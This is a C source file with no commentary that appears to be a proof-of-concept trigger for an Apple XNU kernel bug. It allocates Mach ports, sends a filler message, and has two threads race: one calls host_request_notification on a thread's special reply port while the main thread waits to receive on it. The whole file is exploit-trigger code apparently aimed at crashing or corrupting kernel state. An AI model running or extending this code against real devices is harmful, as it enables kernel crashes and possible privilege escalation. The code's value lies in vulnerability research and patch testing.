#include <assert.h>
#include <mach/mach.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

extern mach_port_t thread_get_special_reply_port();

void send_message(mach_port_t remote) {

    typedef struct message message_t;
#pragma pack(4)
    struct message {
        mach_msg_header_t header;
        char data[0x100];
    };
#pragma pack(0)

    message_t msg = {
        .header =
            {
                .msgh_remote_port = remote,
                .msgh_local_port = MACH_PORT_NULL,
                .msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0),
                .msgh_size = sizeof(msg),
                .msgh_id = 0x41414141,
                .msgh_voucher_port = MACH_PORT_NULL,
            },
    };
    memset(msg.data, 'B', sizeof(msg.data));

    kern_return_t kr =
        mach_msg(&msg.header, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
    assert(kr == KERN_SUCCESS);
}

void receive_message(mach_port_t rcv_port, mach_port_t not_port) {

    typedef struct receive_message_s receive_message_t;
#pragma pack(4)
    struct receive_message_s {
        mach_msg_header_t header;
        char data[0x100];
        mach_msg_trailer_t trailer;
    };
#pragma pack(0)

    receive_message_t msg = {
        .header =
            {
                .msgh_remote_port = MACH_PORT_NULL,
                .msgh_local_port = rcv_port,
                .msgh_size = sizeof(msg),
            },
    };

    kern_return_t kr = mach_msg(&msg.header, MACH_RCV_MSG | MACH_RCV_TIMEOUT | MACH_RCV_SYNC_WAIT,
                                0, msg.header.msgh_size, rcv_port, 1000, not_port);
    assert(kr == KERN_SUCCESS);
}

int g_start = 0;

typedef struct th_request_not_arg_s th_request_not_arg_t;
struct th_request_not_arg_s {
    mach_port_t port;
};

void *th_request_not(void *arg) {
    while (!g_start)
        ;
    mach_port_t special_reply_port = ((th_request_not_arg_t *)arg)->port;
    host_request_notification(mach_host_self(), HOST_NOTIFY_CALENDAR_CHANGE, special_reply_port);
    return NULL;
}

int main() {

    mach_port_t qos_port = MACH_PORT_NULL;
    mach_port_t special_reply_port = MACH_PORT_NULL;

    kern_return_t kr = KERN_SUCCESS;

    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &qos_port);
    assert(kr == KERN_SUCCESS);

    kr = mach_port_insert_right(mach_task_self(), qos_port, qos_port, MACH_MSG_TYPE_MAKE_SEND);
    assert(kr == KERN_SUCCESS);

    special_reply_port = thread_get_special_reply_port();

    send_message(qos_port);

    th_request_not_arg_t not_arg = {
        .port = special_reply_port,
    };
    pthread_t thread_request_not;
    pthread_create(&thread_request_not, NULL, th_request_not, &not_arg);

    g_start = 1;
    receive_message(special_reply_port, qos_port);

    pthread_join(thread_request_not, NULL);

    return 0;
}
